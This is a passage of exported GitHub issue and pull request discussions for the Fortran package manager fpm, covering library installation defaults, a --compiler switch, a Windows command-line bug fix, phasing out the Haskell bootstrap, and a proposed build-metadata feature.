                    "user": "LKedward",
                    "date": "2020-12-14 17:42:04+00:00",
                    "text": "It looks like there is some mixed opinion on the installation of libraries.\nI disagree that most users will want to install their library system-wide and I do not believe that we should be encouraging users to do so. Unlike the c programming language, Fortran does not have a standard ABI and hence it does not make sense for users to install their libraries system wide since the compiled library is specific to the compiler vendor and version. Moreover, there is no agreed-upon standard for where to store the necessary module files, which are similarly binary incompatible between compilers and compiler versions.\nAs @awvwgk pointed out, there are valid exceptions to this \u2013 primarily exporting non-module (legacy) Fortran or c APIs \u2013 however most users should be using Fortran modules and, in the case of third-party build scripts, should be encouraged to be compatible as an fpm dependency by placing outputs in the correct location.\nAs such I believe the behaviour currently implemented in this PR (only executables are installed by default) is strongly preferred."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-14 18:30:00+00:00",
                    "text": "I'm with @LKedward on this one. There are too many issues associated with installing libraries and so we don't really want to encourage users to do it, so it shouldn't be the default. Not the least of which is that if it doesn't install the dependencies too, then the installed library still isn't usable. I think (maybe hope) that this will very quickly become the vast majority of libraries that have this problem. I think it's fine to have a way to install them, because there are times you really want to do it, but it shouldn't be the default.\nOther than that, I'm all good for this to go forward."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-12-14 18:32:47+00:00",
                    "text": "With all the good arguments, I now agree that not installing the library is a saner default."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-14 18:38:57+00:00",
                    "text": "@urbanjost I added the --list functionality to the install command to show the installable targets in a project. Also the install command will now produce an error if there are no installable targets available. The install.library has been documented in the manifest reference as well.\nThe installation of libraries is a tricky thing, we currently have no resolution of the dependencies at all, but only one library target in the fpm_model_t available. This means the installed library will contain the root project and parts of the dependencies as well. To have a meaningful way to install and export library targets for external use or other build systems more work has to be done, like writing a pkg-config file or creating a CMake package file."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-14 21:10:13+00:00",
                    "text": "I also do not want installing libraries to be the default  unless I specify the --libdir and/or --libinclude pathnames;  but the options exist\nfor libraries and include files so I think the documentation should be very clear they are no-ops and specically describe these kind of limiitations and how to override them, or the options should be removed. I have not tried the changes yet but just having a message should help a lot."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-14 23:44:14+00:00",
                    "text": "I also do not want installing libraries to be the default unless I specify the --libdir and/or --libinclude pathnames; but the options exist\nfor libraries and include files so I think the documentation should be very clear they are no-ops and specically describe these kind of limiitations and how to override them, or the options should be removed. I have not tried the changes yet but just having a message should help a lot.\n\nThanks for the clarification, I considered --libdir, --includedir and --bindir no-ops by convention. At least this is the behaviour I observe across the different build tools I use. I can clarify this in the help page as well."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-18 08:44:02+00:00",
                    "text": "Thanks everyone for the review and discussions. I'll go ahead and merge later today."
                }
            ]
        },
        {
            "number": 256,
            "user": "awvwgk",
            "date": "2020-11-28 10:42:08+00:00",
            "title": "Use git plumbing rather than git porcelain commands",
            "text": "Working with the current our current git interface I noticed that we are using the porcelain (high-level) interface for git rather than its plumbing (low-level) interface. I think it is worth to switch from the porcelain to the plumbing interface, since the latter is more predictable and less verbose.\nFor example getting the root commit, with the porcelain command git log -n 1 HEAD results in\ncommit 105644ca8bce711b407e1a15f8f456693f60ff43\nMerge: 2612d9a 846d4e5\nAuthor: Laurence Kedward <laurence.kedward@bristol.ac.uk>\nDate:   Wed Nov 25 16:00:58 2020 +0000\n\n    Merge pull request #246 from LKedward/release_builds\n    \n    CI: upload binaries when a release is published\n\nReading the commit requires to tokenize the first line of the output and the porcelain command output changes depending on the output device.\nUsing the plumbing command git show-ref HEAD --hash instead gives the hash directly:\n105644ca8bce711b407e1a15f8f456693f60ff43\n\nSince we are planning to use libgit2 (see #168) at some point where we would have access to an API of the plumbing commands rather than the porcelain ones, we should adjust this anyway to make this transition as seamless as possible. Unfortunately, the plumbing commands do not support the handy -C directory switching which will make working with them a little more complicated.\nCurrently we use the following three porcelain commands:\n\ngit init\ngit fetch\ngit checkout\n\nJust opening this issue to keep track of it. In case anyone has experience with plumbing command alternatives for the above let me know.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-28 14:55:28+00:00",
                    "text": "Good idea. \ud83d\udc4d  from me."
                }
            ]
        },
        {
            "number": 255,
            "user": "urbanjost",
            "date": "2020-11-27 13:35:25+00:00",
            "title": "Add --compiler switch",
            "text": "added  new switch called --compiler that sets the Fortran compiler name.\n\nThe default compiler name to use is taken from the value of the\nenvironment variable FPM_COMPILER\nIf it is not set the name gfortran is used. as the default\nThe value specified on the command line overrides any default.\n\n--target\nThe list of executables to run with the run and test subcommands\ncan now be prefixed with --target, as with the Haskell version of\nfpm(1).\nSUMMARY\nSo default usage is unchanged from the previous version. By simply setting\nFPM_COMPILER you can use it like the previous version with other compilers for\ndefault debug and release builds.\n  wget http://www.urbanjost.altervista.org/REMOVE/ffpm.f90\n\n  gfortran ffpm.f90 -o $HOME/.local/bin/ffpm\n\n    # get a test package or use your own\n    if [ ! -d M_CLI2 ]\n    then\n       git clone https://github.com/urbanjost/M_CLI2\n    fi\n    cd M_CLI2\n\n    # default build using ifort\n    ffpm build --compiler ifort\n    export FPM_COMPILER=ifort\n    ffpm run\n    ffpm test",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-11-28 01:58:27+00:00",
                    "text": "After trying it for seveal days while trying to load in as many packages as I could find FC being used, I find it is used heavily, but inconsitently. CMake uses it in an interesting way where the name can be followed by compiler options that are used to set the options for a build, which might be an approach to adapt for custom builds not specified via a config file/TOML file setting.  Make of course uses it, and is probably where the \"standard\" use of FC orginated.  Several environment modules such as one for nvfortran use it with a full pathname to the executable. This version handles this by using the basename of the first word of FC; but since the usage is common but varies in meaning significantly I think FPM_FC is needed. If not, as in this implementation, as an override of FC then the cleanest single-option solution seems to be FPM_FC and --fc or FPM_COMPILER and --compiler. Possibly a short name for --compiler would also be desireable. Since the name --fc implies some association with the FC environment variable that is not strictly true in the first scenario, I think it comes down to the second choice. Another factor in favor of that is that --compiler is more compatible with h-fpm.  So, although not my personal first choice. I think that it will be\n--compiler COMPILER_NAME\nwhere the default compiler name is taken from the environment variable FPM_COMPILER if set, else 'gfortran' is used. I still find the use of an environment variable for establishing a default useful so I do not propose dropping that. Any dissents or alternatives?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-11-28 02:06:25+00:00",
                    "text": "the cleanest single-option solution seems to be FPM_FC and --fc or FPM_COMPILER and --compiler. Possibly a short name for --compiler would also be desireable. Since the name --fc implies some association with the FC environment variable that is not strictly true in the first scenario, I think it comes down to the second choice. Another factor in favor of that is that --compiler is more compatible with h-fpm. So, although not my personal first choice. I think that it will be\n--compiler COMPILER_NAME\nwhere the default compiler name is taken from the environment variable FPM_COMPILER if set, else 'gfortran' is used.\n\nHaving thought some more and read your message, I agree and now prefer FPM_COMPILER for the env var and --compiler for the flag."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-28 09:33:47+00:00",
                    "text": "CMake uses it in an interesting way where the name can be followed by compiler options that are used to set the options for a build\n\nCMake also supports reading compile flags from FFLAGS.\n\nSeveral environment modules such as one for nvfortran use it with a full pathname to the executable\n\nIn case of conda-build the FC variable is usually set to something like $BUILD_PREFIX/bin/aarch64-conda-linux-gnu-gfortran, which is still gfortran, but has a lot of additional information in the variable name.\n\nhis version handles this by using the basename of the first word of FC; but since the usage is common but varies in meaning significantly I think FPM_FC is needed\n\nUsing the basename of the compiler found in FC could result in using the wrong compiler. Imagine having two versions of gfortran in your path and you select the latter by giving its explicit path. In this case the basename would be gfortran and the compiler found first in the path would be used instead. Most build systems support both absolute paths to the binary and a name that can be found in the PATH variable."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-28 14:46:13+00:00",
                    "text": "I agree with @milancurcic that they should be FPM_COMPILER and --compiler."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-30 00:52:12+00:00",
                    "text": "PS: Working on a test of the help subcommand but really haven't thought of a satisfying way to say it is good other than size, line count, and a check for a few words.  Used the COUNT() intrinsic to count letter frequency which was intereresting but I decided to drop it (but \"fpm help manual\" produced the expected result with ETA being the three most common letters). Any thoughts on a Fortran-only test of the help output? I am trying to avoid using external system commands."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-02 04:22:45+00:00",
                    "text": "I think the latest push resolves the immediate concerns and sets up for a later reconfig of the compiler options in an OOP structure as a possible later change, but segregates this all into fpm_compiler.f90 for now. So does anyone see any remaining issues?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-06 01:21:16+00:00",
                    "text": "Since ithe conditional compilation PR was  closed I wondered if you saw that note on the code still checking whether to build if the executable exists for run and test? Now that conditional compilation is implemented do you want that removed?\n\nI added a note to the PR or issue (do not remember) but I think it was actually closed so not sure if you saw that or not."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-06 19:18:32+00:00",
                    "text": "PS:  having a -I module_build_directory would make #252 just require writing the TOML data and maybe a build date or even a git commit number in fortran format and sticking it in there with some name like fpm_build.inc.  So that paves the way for that if/when it goes forward."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-07 02:05:58+00:00",
                    "text": "Wondering about these additional NAG switches. Proposing\nRELEASE -unsharedrts\nBOTH -dusty -mismatch_all -dcfuns # loosens up NAG strictness\nBOTH -openmp\nDEBUG -nan\n\nif there is time. Several imply the loosen up the strictness of the NAG compiler. Untried, but they sound useful. Running some of the code thru their polish interface might resolve some of the style differences that have come up for discussion. At least on screen it sounds interesting. If anyone has time to try to get a measure of how many more projects compile with those \"looser\" options that would be interesting.  Glad to hear M_CLI2 compiled up."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-07 10:58:19+00:00",
                    "text": "Many thanks @urbanjost and thanks everyone for reviewing. With three approvals I will now merge.\n\nRegarding the additionally proposed flags for NAG, I suggest leaving them out for now since they do not match any flags requested of the other compilers. (-nan/-finit-real=snan is perhaps a good one to add for the debug builds)"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-07 15:47:08+00:00",
                    "text": "Wondering about these additional NAG switches. Proposing\nRELEASE -unsharedrts\nBOTH -dusty -mismatch_all -dcfuns # loosens up NAG strictness\nBOTH -openmp\nDEBUG -nan\n\nif there is time. Several imply the loosen up the strictness of the NAG compiler. Untried, but they sound useful. Running some of the code thru their polish interface might resolve some of the style differences that have come up for discussion. At least on screen it sounds interesting. If anyone has time to try to get a measure of how many more projects compile with those \"looser\" options that would be interesting. Glad to hear M_CLI2 compiled up.\n\nI would suggest not adding flags for NAG that reduce strictness. I know that much of NAG's draw (at least for me and some others I know) is that it catches so many more potential issues by default. Adding support for a strict compiler and then removing that strictness by default seems like conflicting intent."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-07 15:49:57+00:00",
                    "text": "@everythingfunctional I would suggest to move the discussion about the NAG compiler support to a separate issue to make it more discoverable, now that this PR is merged."
                }
            ]
        },
        {
            "number": 254,
            "user": "LKedward",
            "date": "2020-11-27 11:41:09+00:00",
            "title": "Command line bug on Windows",
            "text": "Running fpm --version (or fpm --help) on Windows using the latest release build (fpm-v0.1.0-windows-x86_64.exe) produces the following error:\nUNKNOWN LONG KEYWORD: --version\nKEYWORD  SHORT PRESENT VALUE\n               F        [F]\n\nNo such error occurs on Linux. I believe this regression was introduced in #239 where the M_CLI2 revision was updatded.\n@urbanjost, are you able to look into this?",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-11-27 12:11:55+00:00",
                    "text": "Okay I've tracked it down to the use of compiler optimisation.\nThe following will work and print help information: fpm run --flag -O0 -- --help, however any non-zero level of optimisation (-O1,-O2,-O3) will fail with the above error message.\n@urbanjost, it looks like the command line interface is possibly relying on some undefined behaviour which is causing issues when compiled with optimisation flags on Windows.\nedit: Tested on Windows 10 with mingw-w64-gcc 8.1.0 where fpm is being bootstrapped with the latest Haskell fpm implementation.\n\nWe should add tests on the release version in our CI."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-27 13:49:05+00:00",
                    "text": "Have not been able to reproduce it on Red Hat, so will need to install mingw on a MSWindows machine. Hopefully that will be straight\nforward."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-28 20:22:09+00:00",
                    "text": "Installed three versions of minogw and also tried in Cygwin, and Cygwin with mingw added and  just running the M_CLI2 tests themselves independent of ffpm (on ifort, nvfortran, and gfortran)\nand I cannot reproduce the problem just building the fortran part. I will try to set up the machine to have the Haskell setup instead of directly compiling the fortran parts.  It did not sound like the problem would require that to duplicate but I have been unable to duplicate it so far."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-28 22:59:21+00:00",
                    "text": "Have you tried the mingw-w64 8.1.0 build available here on plain Windows (same as used in our CI). I'm able to reproduce on a separate Windows machine with this mingw-w64 version using the latest master branch built from scratch.\nc:\\>gcc --version\ngcc (x86_64-win32-seh-rev0, Built by MinGW-W64 project) 8.1.0\n\nAfter building from scratch (delete output folder), with bootstrap fpm I get:\nc:\\msys64\\home\\laure\\git\\fpm3\\fpm>fpm run --release -- --version\nUNKNOWN LONG KEYWORD: --version\nKEYWORD  SHORT PRESENT VALUE\n               F        [F]\n\nAs per my previous comment this appears to be a problem that only occurs with compiler optimization flags hence '--release'."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-29 11:56:32+00:00",
                    "text": "@urbanjost, I believe I've tracked it down to the split(3f) function used both in M_CLI2 and in the fpm_strings module. There appears to be a compiler bug with mingw-w64-gcc 8.1.0 whereby the case (:high) syntax for the select case clause is not correctly implemented.\nI find replacing 'case (:0)' with 'case (0)' fixes the issue:\ndiff --git a/src/M_CLI2.f90 b/src/M_CLI2.f90\nindex 7f95e31..d022a52 100644\n--- a/src/M_CLI2.f90\n+++ b/src/M_CLI2.f90\n@@ -3071,7 +3071,7 @@ integer                       :: imax                   ! length of longest toke\n !-----------------------------------------------------------------------------------------------------------------------------------\n    select case (ilen)\n !-----------------------------------------------------------------------------------------------------------------------------------\n-   case (:0)                                                      ! command was totally blank\n+   case (0)                                                      ! command was totally blank\n !-----------------------------------------------------------------------------------------------------------------------------------\n    case default"
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-29 12:29:25+00:00",
                    "text": "I've created a PR at urbanjost/M_CLI2#4. If you are happy with it, after merging I will open a subsequent PR in this repo with an update revision for M_CLI2 and the same fix applied in the fpm_strings module."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-30 01:50:15+00:00",
                    "text": "Thanks. Had not had time to look at this further till now. Looks like you have a general solution.  Looking at it now."
                }
            ]
        },
        {
            "number": 253,
            "user": "milancurcic",
            "date": "2020-11-26 17:48:33+00:00",
            "title": "Phase out fpm-bootstrap",
            "text": "With #246 merged (great work @LKedward!) a user that arrives to fortran-lang/fpm can easily:\n\nDownload and run a binary for their platform\nDownload and run the same binary to bootstrap fpm from source\n\nfpm thus does not anymore need the Haskell fpm for bootstrapping. However, the README.md still asks the user to install Haskell for building from source. The correct instructions should now be to first download the appropriate fpm binary and then run fpm build in the fpm repo directory.\nI think we should at this point start to de-emphasize the Haskell implementation in this repo as much as possible. It served its purpose superbly (thank you @everythingfunctional!), but it now can confuse newcomers to the project, which is not helpful at best and harmful at worst (I've seen it more than a few times now). With the ever-shorter attention spans, first impressions matter more than ever.\nI propose the following steps to phase out fpm-bootstrap:\n\n Update README.md to not require Haskell for building from source.\n Move the fpm project (contents of https://github.com/fortran-lang/fpm/tree/master/fpm) to the top-level.\n Move contents of https://github.com/fortran-lang/fpm/tree/master/bootstrap to a separate repo. I suggest either fpm-haskell or fpm-hs instead of fpm-bootstrap, because using the word \"bootstrap\" here is now misleading. Ditto with the contents of the archive directory (early Rust prototype), though this one I think we should just remove to not confuse anybody. The code will exist in the git history anyway.\n\nOf course, the Haskell fpm should live on if people want to develop or use it.\nWhat do you think?",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-11-26 17:58:41+00:00",
                    "text": "I agree; simplifying the process for developers should hopefully increase engagement with the project. I realised during #246 that the Haskell version now needs to move to a separate repo now that we are explicitly versioning the Fortran implementation.\nThere is still the issue of bootstrapping on non x86_64 platforms, but I don't know how common these are for development.\nPresumably we can also delete the 'archive' folder which isn't necessary on git?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-26 18:00:39+00:00",
                    "text": "Sounds like a good plan. Splitting projects on GitHub works usually seamlessly. If we want to preserve the git history we can just clone this repository and push it to the new repo and prune the repositories afterwards. Issues relevant for Haskell fpm can be easily moved within repositories of an organisation from my experience, so nothing gets lost in this transition."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-26 18:05:05+00:00",
                    "text": "There is still the issue of bootstrapping on non x86_64 platforms, but I don't know how common these are for development.\n\nI have some experience compiling and packaging for PowerPC and ARM on conda-forge. For now we don't have to worry, we can either bootstrap a version on PowerPC, ARM, ... later with the Haskell version (if stack is available there and we find a CI provider, drone offers ARM, Travis-CI offers PowerPC and ARM) or just cross-compile using our native x86_64 binary (for OSX ARM which nobody offers on CI yet)."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-26 18:11:41+00:00",
                    "text": "From the time we decided to (re)implement in Fortran, that had basically always been the plan. If we've reached that point (which it seems we have), then I'm in favor of it.\nI will echo @LKedward's concern about other architectures, but my understanding is that bootstrapping for new architectures is usually done via cross-compiler tool chains anyways. So if the Fortran version has sufficient support to allow cross-compiling (or it will be completed very soon), then this isn't really a big issue.\nI intend to continue using the Haskell version as a platform for experimentation. If the fortran-lang project does not wish to continue hosting it, I will be happy to keep it going under my personal account. In either case, I hope it becomes less and less necessary over time.\nI must say, the amount of support and community contributions this project has received over the last 9 months (I can't believe we only started this project 9 months ago!) has been quite exciting and far exceeded even my wildest expectations. I owe a great deal of gratitude to everyone who has contributed."
                },
                {
                    "user": "certik",
                    "date": "2020-11-27 17:47:40+00:00",
                    "text": "Thank you Brad, Laurence, Milan, Sebastian and others! Indeed, we are doing really well, I am very happy with the progress so far, and I agree to simply bootstrap using Fortran by default, only keeping the Haskell as a \"backup\", which won't be the default anymore. Also I think we will soon get #123 working, which will allow to bootstrap fpm from Fortran source using cmake on any architecture."
                },
                {
                    "user": "certik",
                    "date": "2020-12-09 19:24:46+00:00",
                    "text": "I tested the fpm (Fortran) binary and it works to bootstrap fpm on my Ubuntu 18.04 machine.\nI suggest to host the Haskell fpm binaries elsewhere, not at the main fpm repository, because it confuses people:\nhttps://twitter.com/MattChallacombe/status/1336738204452417536\nThe released binaries are intended for end users, and end users shouldn't need the Haskell version. The Haskell version is for developers, or to bootstrap fpm from scratch (but then you wouldn't use the binary version anyway)."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 21:36:15+00:00",
                    "text": "I'll go through the issue list and try to cleanup stuff that is already fixed or not relevant anymore. Any help on this is highly appreciated."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-02 21:36:28+00:00",
                    "text": "I pinned this issue since it is important to clarify the relation between the Fortran and Haskell version to avoid further confusion as this milestone issue is now on page two of our issue tracker.\nTo have some more actionable items to move this forward, the next step would be to split the CI and have Fortran fpm bootstrap itself (related #272) with a separate workflow bootstrapping Fortran fpm with the Haskell version. After some testing on this we found that we relying on some Haskell fpm specifics (see #343 + fix #352), which has to be resolved first.\nAfter #272 is resolved we could plan to split the repositories and have Fortran fpm stand on its own. There is still the question where the Haskell version should go. A repository under @fortran-lang namespace is probably the best idea to get a smooth transition."
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-14 16:50:54+00:00",
                    "text": "Is the plan here to completely replace Haskell fpm when bootstrapping Fortran fpm, or are we to retain it for building fpm in the CI for binaries? Issues like #388 and the fact that Haskell fpm doesn't support projects with c sources (required for stdlib_os) mean that it would be beneficial to have a clean break from the Haskell implementation, either using existing fpm binaries, a single-file fpm source or third-party build system (make,cmake) to build fpm in the CI."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-14 16:56:08+00:00",
                    "text": "I'm all for bootstrapping Fortran fpm with itself \ud83d\udc4d. I was planning to have Fortran fpm write meson build files to allow bootstrapping with different build tools but this is quite a task. If we are fine with adding a third-party build system to this repository I can contribute my personal meson setup I'm using for coverage runs."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-03-14 16:58:48+00:00",
                    "text": "I agree, the simplest seems to me to just grab an fpm release binary and use that to bootstrap."
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-14 17:53:34+00:00",
                    "text": "Sounds good! Then it looks like we're on track to complete the phase-out with #389 and then #387 (thanks @awvwgk!).\nAfter which we can create a separate Fortran-Lang repo for the Haskell version.\nSeparately I'd also like to propose that we mark all fpm-haskell issues as wontfix and close them, based on Brad's comment:\n\nIf you really need this fixed in the Haskell version, I am available for contract work to fix it, but I'm not planning on spending much more of my free time (if any) working on the Haskell version since the Fortran version has basically made it obsolete.\n\nDoes anyone have an objection to this?"
                },
                {
                    "user": "milancurcic",
                    "date": "2021-03-14 18:01:29+00:00",
                    "text": "Is it possible to migrate a subset of issues to a new repo (fpm-haskell)?"
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-14 18:10:00+00:00",
                    "text": "Is it possible to migrate a subset of issues to a new repo (fpm-haskell)?\n\nGood point, yes this is possible on github \ud83d\udc4d"
                },
                {
                    "user": "certik",
                    "date": "2021-03-14 18:44:27+00:00",
                    "text": "Let's move the Haskell version out to a separate repository, and we can still use it for a while at the CI, but eventually I would like to simply bootstrap using the CMake backend for fpm that we will write. (As well as using an fpm binary.)"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-03-15 00:29:40+00:00",
                    "text": "I agree with @LKedward that we can move the Haskell version to it's own repo as soon as those issues are done. I think fpm-haskell makes sense as the repo name. And yes, we should move the issues to that repo. I don't know if anyone will ever want to actually work on it, but if it stays usable it might be an easier way to port fpm to new platforms if that ever becomes necessary. But it also might be easier to just set up a cross-compiling toolchain. \ud83e\udd37"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-03-15 20:36:11+00:00",
                    "text": "Creating a {Cmake,make,meson} packaging seems well within reach but using a simple script to make a single-file source or using external tools to create a Cmake and make(1) interface in the distribution now seem quite simple as an interim solution.  I have been using a single-source file( using a simple script and a running fpm(1) installation on a POSIX platform to refresh the file )to bootstrap Fortran fpm on several machines with just git(1) and gfortran(1) in the programming environment for months now. No make, no cmake, no haskell, ... on PCs with Cygwin, mingw, windows bash (or whatever it is being called now) and straight-up MSWindows as well as Linux distros without issue.\nEven if future versions incorporate C or other complications arise in producing a single-file source it seems likely a snapshot of the current version will be able to build future versions for a significant amount of time (in which package generation should be available).  A single-file bootstrap lets you build the current version even without git or a network with no need for a toolchain. It seems like this refactoring of the co-joined fpm(1) into two could proceed now.\nWhat I would like to see is a bootstrap version available via apt-get(1) or rpm(1) or yum(1) or ...  Maybe using the 'other' fpm.  Anyone ever try the 'other' fpm to package fpm?\nDo we have any measures of the downloads of the binary release of the Fortran version versus a bootstrap version?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-15 21:02:28+00:00",
                    "text": "There is probably a neater way to get this info, but who needs API queries when there is shields.io?\n\n\n\nFortran\nHaskell"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-15 21:12:41+00:00",
                    "text": "What I would like to see is a bootstrap version available via apt-get(1) or rpm(1) or yum(1) or ... Maybe using the 'other' fpm. Anyone ever try the 'other' fpm to package fpm?\n\nI was hoping for a high-level build system export that is supported out of the box by those package managers... but actually, why not go for the single source file solution. I remember you shared a version of the script earlier in an issue here, but I can't find it anymore.\nI would give the conda package manager a shot using just a one source file and a Fortran compiler, can't be that hard, can it?\nEdit: Figured it out myself."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-15 22:41:30+00:00",
                    "text": "Anyone want to join on pushing fpm to conda-forge? Comment on conda-forge/staged-recipes#14269 if you want to be a recipe maintainer for fpm. Also we still need a Windows build (either GCC 5 or flang 11 are available)."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-03-16 02:26:43+00:00",
                    "text": "I had never seen shields.io output.  Very interesting."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-30 18:18:46+00:00",
                    "text": "I got the workflow split and can now bootstrap Fortran fpm with itself: #419. Once we got this one in, I will open a PR to delete the bootstrap directory. I think now would be the right time to create a new repository for Haskell fpm under the @fortran-lang namespace."
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-31 07:45:19+00:00",
                    "text": "Great stuff, I've duplicated the repository at https://github.com/fortran-lang/fpm-haskell which we can now prune for just Haskell fpm (fortran-lang/fpm-haskell#1)."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-31 09:22:30+00:00",
                    "text": "@LKedward can you adjust the team scopes to give us push access to fpm-haskell?"
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-31 09:25:03+00:00",
                    "text": "You should have access now"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-31 14:18:54+00:00",
                    "text": "We made it, Fortran fpm now stands on its own and we can bootstrap without the Haskell version \ud83c\udf89. Many thanks to all of you for the hard work to make this possible."
                }
            ]
        },
        {
            "number": 252,
            "user": "urbanjost",
            "date": "2020-11-25 19:28:55+00:00",
            "title": "A proposed \"metadata\" command to include metadata from the TOML configuration file in a Fortran-readable format",
            "text": "Something I miss using fpm(1) versus my own tools is being able to provide metadata to the Fortran files directly such as the build time, compiler version used (which some compilers can now provide via Fortran intrinsics), the version number and\nsuch. Essentially if there were a command that converted the TOML metadata into PARAMETER statements each time the build command were used you would have much the same functionality available. Packages past and present such as sccs(1) provided some way to do this but (unless I missed it) git(1) does not. I am not suggesting this is high priority for fpm(1) but would like it discussed and added to the list as appropriate. If an INCLUDE file could be generated automatically or via  a subcommand it would be much easier to include correct version and license information in programs without having to edit the code files or a manual editing of an include file it is so often easy to overlook changing the build date or version in.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-11-25 19:57:29+00:00",
                    "text": "Sounds like a good idea, having to maintain redundant information in different places is really error prone. For meson and CMake I use configure_file to insert build system meta data as parameter into Fortran source code. I very much in favour of having a configure_file or similar option for fpm as well."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-22 16:13:41+00:00",
                    "text": "@awvwgk is a configure_file in your case a Fortran include file? Nevermind, I see configure_file is essentially a preprocessor mechanism.\nWould there be any advantages to doing this with a (read-only) namelist or maybe having a public fpm_tools module which contains some functions and subroutines to recover such meta-data from some cached build/toml files?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-22 16:18:58+00:00",
                    "text": "Preferably we keep in line with existing configure_file implementations as present in CMake and meson instead of making up our own: https://mesonbuild.com/Configuration.html. In a multi-build system approach one might want to use the same template for fpm, CMake and meson and get the same result independent of the build system used."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-22 16:55:58+00:00",
                    "text": "Can you point me to a Fortran example of yours in a public repository? I still have trouble grasping if the concept relies upon use of the cpp/fpp preprocessor or are the input files preprocessed independently by CMake/meson.\nIs the following a valid setup example?\nI have a template file called projconfig.fi.in, containing\ncharacter(*), parameter :: version = \"@FPM_VERSION_STR@\"\ninteger, parameter :: version_major = @FPM_VERSION_MAJOR@\ninteger, parameter :: version_minor = @FPM_VERSION_MINOR@\ninteger, parameter :: version_bugfix = @FPM_VERSION_BUGFIX@\n\nIn the manifest file of the project, we then specify this as a target for configuration, with the actual preprocessing/replacement done by an extension to fpm or a special command. The template substitution rules would follow the same definitions as CMake and Meson.\nFinally in the main module of my project, I can include the configured template file as:\nmodule myproject\n\n  include \"projconfig.fi\"\n\nend module"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-22 17:04:56+00:00",
                    "text": "For an example see:\nhttps://github.com/MarDiehl/stdlib_os/blob/c03a636/src/os.name.in\nhttps://github.com/MarDiehl/stdlib_os/blob/c03a636/src/os.f90#L43\nI made a small implementation here when working on the fpm-dist command\nhttps://github.com/fortran-lang/fpm/blob/e2a837b/fpm/src/fpm/dist/meson.f90#L433-L473"
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-22 17:18:37+00:00",
                    "text": "For an example see:\nhttps://github.com/MarDiehl/stdlib_os/blob/c03a636/src/os.name.in\nhttps://github.com/MarDiehl/stdlib_os/blob/c03a636/src/os.f90#L43\n\nInteresting, if stdlib-os currently relies upon this configuration mechanism, and we want fpm to rely upon on stdlib-os in the future to get the operating system ID, does this mean that to bootstrap fpm using the Haskell version, it is necessary to use the current build-script feature (using CMake) or extend the Haskell version to support OS identification and configure file template substitution? This reminds me of the movie Inception..."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-22 17:24:02+00:00",
                    "text": "You can just cut the loop short and drop Haskell fpm from it, with support for configure_file in Fortran fpm we are already fine to dependent on stdlib_os once it is ported to fpm. No need to make life more complicated than necessary, just look for changeable parts were changes are simple to make."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-01-24 04:02:05+00:00",
                    "text": "As a simpler scheme that leverages some of the existing fpm components and required user knowledge, and does not require a preprocessor I would propose something like this:\no fpm parses the fpm.toml file (which it already does) and obtains the version number and other metadata such as the project name and author.  It then gets the compiler name from the command line, and the current time, and possibly the compiler options and the OS type.\no the build commands could add a -D $OS_TYPE and -D $COMPILER option or equivalent to the compiles, which I think all  major compilers support for use with cpp/fpp or their equivalent.\no using the metatadata it writes and compiles a module called fpm_metadata that creates a type of METADATA.\nThis could be ignored by the fpm user, but if desired they could include \"use fpm_metadata, only : metadata\" in their program and then get to at least a standard set of keywords by using such things as:\nwrite(*,*)'VERSION',metadata%version\nwrite(*,*)'COMPILE_TIME',metadata%compile_time\nand so on.  As more functions become available (via stdlib, preferably) such things as the equivalent of the output of a uname(1) command could also become default behavior.\nThis would require no preprocessing of the user code, supply a standard set of variables that could be used by all packages,\nand allow for standard names to be used in preprocessing and leverage the existing TOML configuration file and 